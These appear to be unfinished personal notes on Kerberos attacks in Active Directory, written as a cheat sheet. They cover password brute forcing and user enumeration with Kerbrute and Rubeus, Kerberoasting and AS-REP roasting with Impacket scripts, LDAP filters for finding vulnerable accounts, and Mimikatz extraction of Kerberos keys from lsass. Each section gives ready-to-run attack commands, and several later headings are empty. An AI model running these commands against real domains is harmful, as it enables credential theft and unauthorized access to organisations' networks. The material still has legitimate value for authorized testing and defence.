# Brute Force
We can brute force username and password based on the errors that we get from kerberos.
- `KDC_ERR_PREAUTH_FAILED`: Incorrect password
- `KDC_ERR_C_PRINCIPAL_UNKNOWN`: Invalid username
- `KDC_ERR_WRONG_REALM`: Invalid domain
- `KDC_ERR_CLIENT_REVOKED`: Disabled/Blocked user
### Rubeus
```powershell
./rubeus.exe brute /password:<password> /noticket
```
### Kerbrute (go)
1. User Enumeration
```bash
./kerbrute userenum -d mydomain.local usernames.txt
```
2. Password brute-force
```bash
cat user_password.txt | ./kerbrute -d mydomain.local bruteforce -
```
### Kerbrute.py
```bash
python kerbrute.py -domain mydomain.local -users user.txt -passwords pass.txt -dc-ip <ip>
```
# Kerberoast
- ST can be requested by any user for any service if it's [[Active Directory/AD Concepts/Services#SPN|SPN]] is registered in the domain.
- STs are encrypted with the service account which runs the service.
- Hence, we can try to crack the password of the service user account.
- In case of managed service accounts, the password is of 120 characters and changes every month, hence it is not possible to crack their password.
- However, some services are run with normal user accounts, managed by people, that can have weak password.
- Kerberoast deals with service running under regular user accounts. We can get STs for the services and crack their password.
We can query for users with SPNs with LDAP module or AD-RSAT module
- LDAP
```ladp
(&(samAccountType=805306368)(servicePrincipalName=*))
```
- AD-RSAT
```powershell

```
Impacket's `GetUserSPNs.py` script can be used to query users with SPN and request STs for the service.
```bash
# This will search for SPNs, request STs for the same using supplied credentials and same the STs in "kerberoast.hash"
python GetUserSPNs.py 'mydomain.local@a.drdragon:Password!!' -dc-ip <ip> -outputfile kerberoast.hash
```
# AS-REPRoast
- In kerberos, pre-authentication is required for users. 
- Pre-Authentication is when a user sends the timestamp encrypted with it's kerberos key to request TGT (AS-REQ)
- In some cases, some users may have the `DONT_REQUIRE_PREAUTH` flag set. These users don't need to encrypt their timestamp with their kerberos key, hence anyone can create AS-REQ as that user and receive AS-REP encrypted with these users's key.
- AS-REProast involves impersonating these users and receiving the AS-REP. The AS-REP can be cracked offline to recover the password of the user.
- LDAP filter to query users without pre-authentication.
```ldap
(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304))
```
- Impacket's GetNPUsers.py script can be used to get the users without pre-authentication and get their AS-REP data.
```bash
GetNPUsers.py 'mydomain.local\drdragon:Password!!' --dc-ip -outputfile asrep-hashes.txt
```

# Pass the Key/Overpass the Hash
- To request a TGT, the user needs to send a timestamp encrypted with it's key.
- If we have a user's key, it can be used to request a TGT of the user.
- Kerberos keys are cached in `lsass` process. Can be extracted using [[Active Directory/Credential Dumping/Mimikatz|Mimikatz]]
```bash
sekurlsa::ekeys
```


# Golden Tickets
# Silver Tickets
# Kerberos Delegations
### Unconstrained Delegation
### Constrained Delegation
# Pass the Key